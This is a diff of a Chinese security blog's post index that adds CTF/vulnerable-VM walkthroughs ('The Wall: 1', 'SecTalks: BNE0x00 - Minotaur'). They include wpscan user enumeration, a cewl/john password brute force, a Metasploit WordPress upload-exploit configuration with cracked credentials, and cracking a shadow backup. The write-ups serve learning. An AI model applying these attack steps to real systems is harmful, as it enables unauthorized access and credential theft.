+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848893489-5b6c0d17-36ba-4f7a-826a-cfa7618613f8.png#align=left&display=inline&height=327&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1199&size=67063&status=done&style=stroke&width=652" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>参考：<br><a href="https://pentesterlab.com/exercises/play_xxe/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/play_xxe/course</a><br><a href="http://www.beesfun.com/2017/04/21/play渗透框架XXE实体攻击/" target="_blank" rel="noopener">http://www.beesfun.com/2017/04/21/play 渗透框架 XXE 实体攻击/</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>ROP Tricks</title>
     <url>/2020/03/16/nhdeg6/</url>
     <content><![CDATA[<p>关于栈迁移部分，之前已经介绍过了，就不记录了</p>
@@ -14714,6 +14844,103 @@
 ]]></content>
   </entry>
   <entry>
+    <title>The Wall: 1(有坑)</title>
+    <url>/2020/08/10/rg6b9p/</url>
+    <content><![CDATA[<p>nmap 扫了一下，并没有得到什么信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597022292459-71cbabcf-753a-4ef9-bf96-06638f0f7d4f.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1920&size=568126&status=done&style=stroke&width=960" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后 wireshark 抓包</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597024114560-fd9d720d-0628-41dd-9492-b51d306859e0.png#align=left&display=inline&height=455&margin=%5Bobject%20Object%5D&name=image.png&originHeight=910&originWidth=1526&size=173514&status=done&style=none&width=763" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>发现靶机在寻找 1337 端口，那么我们 nc -lvp 1337 监听一下<br>收到了这样的消息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597024314467-882b1ec0-11ba-42a7-9e0e-5d58b78af66c.png#align=left&display=inline&height=425&margin=%5Bobject%20Object%5D&name=image.png&originHeight=849&originWidth=1905&size=1867683&status=done&style=none&width=952.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这时候再次扫描端口的时候就可以扫描到了一个</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597024703420-f30972ff-3eb0-45d3-8d9d-1b606d8d6fc5.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1917&size=451684&status=done&style=stroke&width=958.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问 ip 获得一张图片</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597024770235-168d0504-9494-4152-9987-e2a35556f6e0.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1919&size=1251316&status=done&style=none&width=959.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>查看网页源码有一些注释</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597024808365-1688d53e-dd85-4e71-bf28-6ab2149c7838.png#align=left&display=inline&height=220&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=1306&size=49063&status=done&style=stroke&width=685" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>把下面那串数字作为十六进制，转为字符串得到如下：<br>steg=33115730dbbb370fcbe9720fe632ec05</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597024895782-4b780382-1d8b-4cfb-a040-a3af99010b38.png#align=left&display=inline&height=244&margin=%5Bobject%20Object%5D&name=image.png&originHeight=487&originWidth=868&size=31705&status=done&style=stroke&width=434" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>啊哈 MD5 解出来：divisionbell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597025923755-94b6b4eb-88a0-424c-a2da-f5438e1148c8.png#align=left&display=inline&height=209&margin=%5Bobject%20Object%5D&name=image.png&originHeight=418&originWidth=960&size=33867&status=done&style=stroke&width=480" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用<br>steghide –extract -sf pink_floyd.jpg<br>把网页上的图片中隐藏的信息提取出来</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597026360753-eb2037d8-f0e1-41de-8e40-8a7e4d9b821f.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=1245&size=595792&status=done&style=none&width=694" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0<br>SydBarrett | pinkfloydrocks</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1597027535435-b1169184-ebfe-4fed-be1f-11af3b808988.png#align=left&display=inline&height=44&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=1268&size=130375&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用这个账号密码去登陆 ftp</p>
+<p><strong>1965 端口的，我死活扫不出来</strong></p>
+]]></content>
+  </entry>
+  <entry>
     <title>DC-7</title>
     <url>/2020/04/27/rgi4ih/</url>
     <content><![CDATA[<p>nmap 扫描一下端口</p>
@@ -15610,6 +15837,104 @@
 ]]></content>
   </entry>
   <entry>
+    <title>SecTalks: BNE0x00 - Minotaur</title>
+    <url>/2020/08/24/tirefu/</url>
+    <content><![CDATA[<p>按照之前的方法，但是这里是 dhcp 被注释掉了<br>把那些白的删掉，箭头指向的那一行的注释去掉</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598232357045-39093f63-8151-4005-a4eb-c75871a6aa8b.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=image.png&originHeight=400&originWidth=720&size=26762&status=done&style=none&width=496" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>nmap -p- -A 192.168.149.196</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598232656467-db97e017-3f88-4ec6-8d18-5ae6bc6e52d2.png#align=left&display=inline&height=507&margin=%5Bobject%20Object%5D&name=image.png&originHeight=699&originWidth=839&size=154235&status=done&style=none&width=608" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>ftp 匿名登录进去啥都没有</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598245608281-6e821708-f8e2-491b-a154-3eff02dcb725.png#align=left&display=inline&height=397&margin=%5Bobject%20Object%5D&name=image.png&originHeight=426&originWidth=589&size=84080&status=done&style=none&width=549" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>80 端口有个 apache 的默认页面<br>然后扫描目录扫出来一个 bull，访问是一个 wordpress 的博客，扫描一波，出来个用户名 bully<br><code>wpscan --url http://192.168.149.196/bull/ -eu</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598248683445-ccf69c43-e02a-4760-b8b8-bae7d86805bd.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=773&originWidth=1091&size=155572&status=done&style=none&width=545.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后爆破一下（字典用 cewl 获取页面上的内容）<br><code>cewl -w words.txt -m 6 http://192.168.149.196/bull/</code><br>-m 这个参数指定的是长度<br><code>john --wordlist=words.txt --rules --stdout &gt; words-john.txt</code><br>john 处理一下，生成一些组合出来的</p>
+<p><code>wpscan --url http://192.168.149.196/bull/ --passwords ./words-john.txt -U bully</code><br>然后用组合出来的字典跑出来 bully 账户密码为 Bighornedbulls</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598275288484-7e0c92d7-079b-4bf2-a3dd-08f4277c6c1c.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=image.png&originHeight=429&originWidth=1091&size=86121&status=done&style=none&width=703" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后可以用 msf 直接来拿 shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_slideshowgallery_upload</span><br><span class="line">set RHOST 192.168.149.196</span><br><span class="line">set TARGETURI &#x2F;bull&#x2F;</span><br><span class="line">set WP_USER bully</span><br><span class="line">set WP_PASSWORD Bighornedbulls</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598276472885-022d753b-69b7-42c4-9c30-6cbc8d3fbd7f.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=775&originWidth=1524&size=1153924&status=done&style=none&width=762" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在 /var/www/html 目录下有个 flag</p>
+<p>/tmp 目录下也有，同时还有个 shadow.bak</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598277372436-8dc6b180-d6bc-462a-9a16-740c8f85889d.png#align=left&display=inline&height=247&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=828&size=367007&status=done&style=none&width=604" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>保存出来用 john 暴力跑一下，得到：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598277506386-c7502414-6159-4a15-88df-9b2feb31b00c.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=796&originWidth=1321&size=1232478&status=done&style=none&width=660.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>切换用户 heffer 在用户目录得到一个 flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598277610850-a88a5204-8d58-4f35-a321-e492175ceb7e.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=412&originWidth=1053&size=551473&status=done&style=none&width=526.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>切换 minotaur 同样在用户目录得到一个 flag<br>用 sudo -l 查看一下发现可以用 sudo 执行任意的命令？</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598277829618-ed8c7820-6fef-423a-9e63-3945b7c384d1.png#align=left&display=inline&height=554&margin=%5Bobject%20Object%5D&name=image.png&originHeight=752&originWidth=996&size=882525&status=done&style=none&width=734" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+]]></content>
+  </entry>
+  <entry>
     <title>Mango</title>
     <url>/2020/03/09/tp9x81/</url>
     <content><![CDATA[<figure class="image-bubble">
@@ -16400,7 +16725,7 @@
 <h1 id="NoSQL-注入"><a href="#NoSQL-注入" class="headerlink" title="NoSQL 注入"></a>NoSQL 注入</h1>]]></content>
   </entry>
   <entry>
-    <title>Extend&amp;amp;Overlapping</title>
+    <title>Extend&amp;Overlapping</title>
     <url>/2020/06/15/ucozlv/</url>
     <content><![CDATA[<p>用的是这个 <a href="https://github.com/Mipu94/peda-heap" target="_blank" rel="noopener">peda-heap</a> 插件</p>
 <figure class="image-bubble">
